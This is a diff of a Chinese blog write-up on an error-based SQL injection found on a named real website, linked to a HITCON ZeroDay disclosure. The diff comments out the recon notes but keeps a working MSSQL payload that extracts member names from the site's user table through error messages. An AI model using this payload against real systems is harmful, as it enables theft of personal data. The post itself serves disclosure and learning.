@@ -5,15 +5,17 @@ last_update:
   date: "2025-08-21T08:00:00+08:00"
 ---
 
-## 先備知識
+本文是 https://zeroday.hitcon.org/vulnerability/ZD-2025-01030 的延伸
+
+<!-- ## 先備知識
 
 - 目標: `https://www.wowisee.com/list2.asp?keyword=`，keyword 是注入點
 - 網站架構: Microsoft-IIS/8.5 + ASP.NET
 - Server 會回傳 SQL Error Message
 - 回傳的編碼是 Big5
-- 可使用 Burp Suite 把 Hex 複製下來，再用 [hextostring](https://www.hextostring.com/) 轉換
+- 可使用 Burp Suite 把 Hex 複製下來，再用 [hextostring](https://www.hextostring.com/) 轉換 -->
 
-## 測試過程
+<!-- ## 測試過程
 
 - 使用 Burp Suite Repeater 發送 HTTP Request
 - queryString 的 value 使用我熟悉的 JS 來生成
@@ -147,20 +149,15 @@ Microsoft SQL Server 2008 (SP4) - 10.0.6000.29 (X64)
 	Enterprise Edition (64-bit) on Windows NT 6.1 &lt;X64&gt; (Build 7601: Service Pack 1)
 ```
 
-7. 接下來請參考 [ZD-2025-01030](https://zeroday.hitcon.org/vulnerability/ZD-2025-01030)
+7. 接下來請參考 [ZD-2025-01030](https://zeroday.hitcon.org/vulnerability/ZD-2025-01030) -->
 
 ## 學到的東西
 
 1. 編碼轉換，可使用 [Hex to String Converter Online](https://www.hextostring.com/)
-2. `SELECT TOP 10` 跟 `FOR XML PATH('')`
+2. MSSQL 引出 SQLi Error Message 的方法
 
-```js
-const sp = new URLSearchParams();
-sp.append(
-  "keyword",
-  `' AND 1 = CONVERT(int,(SELECT TOP 10 姓名 + '|' FROM 會員 FOR XML PATH('')))--123`,
-);
-console.log(sp.toString().split("keyword=")[1]);
+```sql
+' AND 1 = CONVERT(int,(SELECT TOP 10 姓名 + '|' FROM 會員 FOR XML PATH('')))--123
 ```
 
 3. 需要看 HTTP Response Hex 的時候，真的要用 Burp Suite 的 Repeater，超好用
